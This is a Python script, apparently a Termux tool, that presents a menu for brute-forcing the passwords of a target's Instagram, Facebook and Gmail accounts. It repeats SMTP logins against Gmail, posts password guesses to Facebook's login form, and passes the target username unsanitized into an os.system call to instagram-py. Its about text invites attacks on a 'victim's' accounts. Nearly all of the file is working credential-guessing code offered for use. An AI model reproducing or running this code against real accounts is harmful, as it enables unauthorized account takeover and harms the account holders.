

from __future__ import absolute_import
from __future__ import print_function
import os
import threading
import sys
import requests
from bs4 import BeautifulSoup
import smtplib
from time import sleep

passs = ('''
\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mSelect password type:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Default
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Custom
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m Back
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Exit

\033[1;91mhackos\033[1;97m>>\033[1;92m ''')

main_menu = ('''
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Select an option:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Instagram    
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Facebook         
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m E-mail
\033[1;91m[\033[1;97m4\033[1;91m]\033[1;92m About
\033[1;91m[\033[1;97m5\033[1;91m]\033[1;92m Connect with US       
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Exit

\033[1;91mhackos\033[1;97m>>\033[1;92m ''')

banr = ("""\033[1;92m
                                                            
@@@@@@@   @@@@@@@   @@@@@@@@      @@@@@@         @@@@@@@@   
@@@@@@@@  @@@@@@@@  @@@@@@@@     @@@@@@@@       @@@@@@@@@@  
@@!  @@@  @@!  @@@  @@!               @@@       @@!   @@@@  
!@!  @!@  !@   @!@  !@!              @!@        !@!  @!@!@  
@!@!!@!   @!@!@!@   @!!!:!          !!@         @!@ @! !@!  
!!@!@!    !!!@!!!!  !!!!!:         !!:          !@!!!  !!!  
!!: :!!   !!:  !!!  !!:           !:!           !!:!   !!!  
:!:  !:!  :!:  !:!  :!:          :!:       :!:  :!:    !:!  
::   :::   :: ::::   ::          :: :::::  :::  ::::::: ::  
 :   : :  :: : ::    :           :: : :::  :::   : : :  :   
                                                             
\033[1;91m<═══\033[1;41m\033[1;97m Created by Rihan Ahmed \033[;0m\033[1;91m═══>\033[1;92m""")

about = ("""\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mBruteforce Introduction:

\033[1;97m➤ \033[1;92mA brute-force attack is a cryptanalytic attack that can, in theory, be used to attempt to decrypt any encrypted data (except for data encrypted in an information-theoretically secure manner).[1] Such an attack might be used when it is not possible to take advantage of other weaknesses in an encryption system (if any exist) that would make the task easier.

When password-guessing, this method is very fast when used to check all short passwords, but for longer passwords other methods such as the dictionary attack are used because a brute-force search takes too long. Longer passwords, passphrases and keys have more possible values, making them exponentially more difficult to crack than shorter ones.[2]

Brute-force attacks can be made less effective by obfuscating the data to be encoded making it more difficult for an attacker to recognize when the code has been cracked or by making the attacker do more work to test each guess. One of the measures of the strength of an encryption system is how long it would theoretically take an attacker to mount a successful brute-force attack against it.[3]

Brute-force attacks are an application of brute-force search, the general problem-solving technique of enumerating all candidates and checking each one.

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Features Of Rihan444:

\033[1;97m➤ \033[1;92mYou can bruteforce attack on your victim's Instagram, Facebook and Email ID with 100 password/second you can add your own custom password list and this tool also has password list, so If you don't have your own password list then it's ok don't worry you can use auto attack function (In this function you don't need your own password list).

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Author:

\033[1;97m➤ \033[1;92mTool Brute  is created by Rihan Ahmed
\033[1;92m""")

connect_with_us = ("""\033[1;97m
➤ \033[1;92mIf you want to connect with us then you can connect follow Bangladash Hacking Help Center on these social media

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Facebook ID : 
\033[1;97m➤\033[1;92m Username: Rihan Ahmed
\033[1;97m➤ \033[1;92mProfile Link: \033[;94m
https://www.facebook.com/white.hat.hacker.Rihan
\033[1;92m
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Facebook Group:
\033[1;97m➤ \033[1;92mFB Group: Bangladash Hacking Help Center
\033[1;97m➤ \033[1;92mProfile Link:\033[1;94m 
https://facebook.com/groups/3749151271810746/
\033[1;92m
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Github:
\033[1;97m➤\033[1;92m Username: Rihan444
\033[1;97m➤ \033[1;92mProfile Link:\033[1;94m https://github.com/Rihan444
\033[1;92m
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m FB Page:
\033[1;97m➤ \033[1;92mpage Name: Bangladash Hacking Help Center
\033[1;97m➤ \033[1;92mPage  Link:\033[1;94m https://m.facebook.com/profile.php?id=100082481366200
\033[1;92m
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Youtube Channel : 
\033[1;97m➤\033[1;92m Username: Bangladash Hacking Help Center
\033[1;97m➤ \033[1;92mProfile Link: \033[;94m
https://youtube.com/channel/UCkmnM4sMEK3S9pYAykZXsrQ
\033[1;92m""")

def hackmail():
	class GmailBruteForce():
	    def __init__(self):
	        self.accounts = []
	        self.passwords = []
	        self.init_smtplib()
	
	    def get_pass_list(self,path):
	        file = open(path, 'r',encoding='utf8').read().splitlines()
	        for line in file:
	            self.passwords.append(line)
	
	    def init_smtplib(self):
	        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
	        self.smtp.starttls()
	        self.smtp.ehlo()
	    
	    def try_gmail(self):
	
	        for user in self.accounts:
	            for password in self.passwords:
	                try:
	                    self.smtp.login(user,password)
	                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
	                    self.smtp.quit()
	                    self.init_smtplib()
	                    break;
	                except smtplib.SMTPAuthenticationError:
	
	                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
	
	instance = GmailBruteForce()
	
	headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	
	instance.accounts.append(usr)
	instance.get_pass_list(passlist)
	
	instance.try_gmail()

def hackbook():
	if sys.version_info[0] !=3: 
		sys.exit()
	
	post_url='https://www.facebook.com/login.php'
	headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
	}
	payload={}
	cookie={}
	
	def create_form():
		form=dict()
		cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	
		data=requests.get(post_url,headers=headers)
		for i in data.cookies:
			cookie[i.name]=i.value
		data=BeautifulSoup(data.text,'html.parser').form
		if data.input['name']=='lsd':
			form['lsd']=data.input['value']
		return (form,cookie)
	
	def function(email,passw,i):
		global payload,cookie
		if i%10==1:
			payload,cookie=create_form()
			payload['email']=email
		payload['pass']=passw
		r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
		if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
			open('temp','w').write(str(r.content))
			print('\npassword is : ',passw)
			return True
		return False
	
	file=open(passlist,'r')
	
	print("\nTargeted ID :",usr)
	print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92mTrying Passwords from your password list ..." , '\033[1;91m', '\n' )
	
	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len(passw) < 6:
			continue
		print(str(i) +" : ",passw)
		if function(usr,passw,i):
			break



# main script start

while True:
	os.system('clear')
	print(banr)
	menu = input(main_menu)
	if menu == '01' or menu == '1':
		print('\n\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Run tor in another session of termux')
		sleep(1)
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target username:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No username detected\n')
			else:
				break
			
		while True:
			pas = input(passs)
			if pas == '01' or pas == '1':
				print()
				os.system("instagram-py --username " + usr + " --password-list .pass.txt")
				input("\033[1;94mPress ENTER To Continue")
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path: \033[1;97m')
				os.system("instagram-py --username " + usr + " --password-list " + passlist)
				input("\033[1;94mPress ENTER To Continue")
				break
			elif pas == '3' or pas == '03':
				break
			elif pas == '0' or pas == '00':
				exit()
				
	elif menu == '02' or menu == '2':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target User ID:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m User ID not detected')
			else:
				break
		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
		hackbook()
		input("\033[1;94mPress ENTER To Continue")
		
	elif menu == '03' or menu == '3':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target Email ID:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Email ID not detected')
			else:
				break

		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected\n')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')

		hackmail()
		input("\033[1;94mPress ENTER To Continue")

	elif menu == '4' or menu == '04':
		print()
		print(about)
		while True:
			a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Do you want to go in main menu \033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m:\033[1;97m ')
			if a == 'y' or a == 'Y':
				break
			elif a == 'n' or a == 'N':
				exit()
			elif a == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				sleep(1)
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
				sleep(1)

	elif menu == '5' or menu == '05':
		print()
		print(connect_with_us)
		while True:
			a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Do you want to go in main menu \033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m: \033[1;97m')
			if a == 'y' or a == 'Y':
				break
			elif a == 'n' or a == 'N':
				exit()
			elif a == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				sleep(1)
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
				sleep(1)

	elif menu == '00' or menu == '0':
		print()
		exit()
	elif menu == '':
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
		sleep(1)
	else:
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
		sleep(1)


